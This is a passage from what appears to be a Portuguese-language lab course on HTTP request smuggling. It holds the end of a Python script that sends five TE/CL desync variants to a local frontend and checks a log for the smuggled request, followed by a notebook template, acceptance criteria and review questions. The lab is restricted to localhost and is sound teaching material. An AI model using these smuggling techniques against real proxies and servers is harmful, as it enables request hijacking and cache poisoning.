    return depois - antes


def main():
    print("═══ AS CINCO VARIANTES ═══")
    print()
    print(f"  frontend: {HOST}:{PORT}   ⚠ LOCAL")
    print(f"  log     : {LOG}")
    print()
    print(f"  {'variante':<12} {'req. novas':<12} {'escondido apareceu?':<24}")
    print("  " + "-"*52)

    resumo = []
    for nome, payload, marca in CASOS:
        n = manda(payload)
        _, log = conta()
        apareceu = "⚠⚠ SIM" if marca in log else "não"
        resumo.append((nome, n, apareceu))
        print(f"  {nome:<12} {n:<12} {apareceu:<24}")

    print()
    print("  ═══ O VEREDITO ═══")
    for nome, n, ap in resumo:
        if ap.startswith("⚠"):
            print(f"  {nome}: ⚠⚠ DESYNC — o pedido escondido chegou ao backend")
        elif n == 0:
            print(f"  {nome}: · rejeitado ou não repassado")
        else:
            print(f"  {nome}: · sem desync (só a 1ª chegou)")
    print()
    print("  ⚠ e a contagem por camada é a MEDIDA.")
    print("  ⚠ tudo local. nenhum serviço de terceiro.")


if __name__ == "__main__":
    main()
PY

chmod +x mede-cinco.py
echo "  ── pronto ──"
echo "     python3 ~/smuggle-lab/mod03/mede-cinco.py 8081"
```

⚠ **O medidor roda as cinco de uma vez, e o resumo diz quais deram desync.** **E o critério é a
string no log** — **não a interpretação.**

⚠ **E a variante 5 (`CL.0`) é a que mais provavelmente não funcionará** — **porque o backend
didático do módulo 3 **lê** o corpo.** **E é o ponto:** **o `CL.0` exige um backend que **responda
antes de ler** — **e isso é o exercício do módulo 8.**

**Produza `cinco-variantes.md`:**

| Variante | Req. novas | Escondido apareceu? |
|---|---|---|
| CL.TE | | |
| TE.CL | | |
| TE.TE | | |
| CL.CL | | |
| CL.0 | | |

**Responda:**

1. **Quantas variantes deram desync?**
2. **Qual deu o resultado mais claro?**
3. **A `CL.0` funcionou?** Por que não, se não?
4. **A contagem é a medida?** Onde ela está?

### Passo 3 — Registre as cinco (40 min)

Produza `caderno/PD-003.md`:

```markdown
# PD-003 — as cinco variantes de TE/CL

**Data:** ____

## 1. O par e a regra
| Camada | Regra | Porta |
|---|---|---|
| frontend | | |
| backend | | |

## 2. As três condições (módulo 2)
| # | Condição | Resultado |
|---|---|---|
| 1 | persistente | |
| 2 | discordam | |
| 3 | repassa o original | |

## 3. As cinco variantes
| # | Variante | Req. novas | Escondido apareceu? | ⚠ Desync? |
|---|---|---|---|---|
| 1 | CL.TE | | | |
| 2 | TE.CL | | | |
| 3 | TE.TE | | | |
| 4 | CL.CL | | | |
| 5 | CL.0 | | | |

## 4. A variante que funcionou
| Item | Valor |
|---|---|
| Qual | |
| Por que | |
| O payload (bytes) | |

## 5. A evidência literal
```
comando
```
```
[frontend]
```
```
[backend]
```

## 6. A regra da spec
| Versão | Recomenda |
|---|---|
| RFC 9112 | ⚠ REJEITAR |
| ⚠ e este par faz | |

## 7. Categoria (Parser Differentials, módulo 3)
| Item | Valor |
|---|---|
| Q1 a spec decide? | ⚠ SIM (rejeitar) |
| Q2 as duas seguem? | ⚠ NÃO |
| ⚠ Categoria | 3 — viola a spec |

## 8. ⚠ O que eu NÃO fiz
- [ ] não apontei para CDN, WAF ou host de terceiro
- [ ] não testei em produção
- [ ] não usei o desync para ACESSAR nada
- [ ] não publiquei nada

## 9. O que NÃO foi verificado
⚠ mínimo 3
```

**Produza `registro.md`:**

| Variante | Desync? | Categoria |
|---|---|---|
| | | |

**Responda:**

1. **Qual variante deu desync?**
2. **A categoria é 3?** Por quê?
3. **A spec recomenda o quê?** O par segue?
4. **O que não foi verificado?**

### Critérios de aceitação

- `spec.md` com as **três** versões da RFC e o que cada uma diz.
- Você explicou **por que a spec de 2022 não resolve o problema**.
- Você explicou **por que "remover o CL" é tolerância**.
- `variantes.md` com as **duas** variantes opostas.
- Você explicou **a diferença de encaminhamento** entre CL.TE e TE.CL.
- Você explicou **por que o frontend não "descarta" o resto**.
- `te-te.md` com as **seis** ofuscações.
- Você explicou **por que o espaço antes do `:` é a mais elegante**.
- Você citou **quatro** comportamentos possíveis do CL.CL.
- `cl-zero.md` com os **quatro** lugares onde o backend ignora o corpo.
- Você explicou **por que o WAF + backend é o caso de maior rendimento**.
- Você explicou **por que o CL.0 é a variante moderna**.
- O **par divergente** montado, com as regras opostas.
- As **cinco variantes** rodadas, com a contagem de cada.
- Você usou a **string no log** como prova.
- Você explicou **por que a `CL.0` pode não funcionar** com o backend do módulo 3.
- `caderno/PD-003.md` com as **nove** seções.
- Você classificou pela **cascata** do Parser Differentials.
- ⚠ **Nenhum serviço de terceiro.** Tudo em 127.0.0.1.

---

## Avaliação

1. **O que a RFC 2616 dizia?** E a 7230?
2. **O que a 9112 recomenda?** Por que não basta?
3. **Por que "remover o CL e usar o TE" é tolerância?**
4. **Cite as cinco variantes.**
5. **Em qual o frontend usa CL?** E o backend?
6. **Em CL.TE, quem mente?** Em TE.CL?
7. **Qual a diferença de encaminhamento** entre as duas?
8. **Por que o frontend não "descarta"** o que sobra?
9. **O que caracteriza o TE.TE?**
10. **Cite quatro ofuscações.**
11. **Qual é a mais elegante?** Por quê?
12. **Cite quatro comportamentos possíveis do CL.CL.**
13. **Por que a spec mudou para rejeitar?**
14. **O que é o CL.0?** Por que usa um header só?
15. **Cite três lugares onde o backend ignora o corpo.**
16. **Por que o WAF + backend rende mais** com CL.0?
17. **Por que o CL.0 é a variante moderna?**
18. **O que todas as cinco dependem?**
19. **Qual é a prova do desync?** Como se lê?
20. **Qual categoria da cascata** é uma variante de TE/CL? Por quê?

---

**Próximo:** [Módulo 4 — Outras variantes de H1](modulo-04.md)
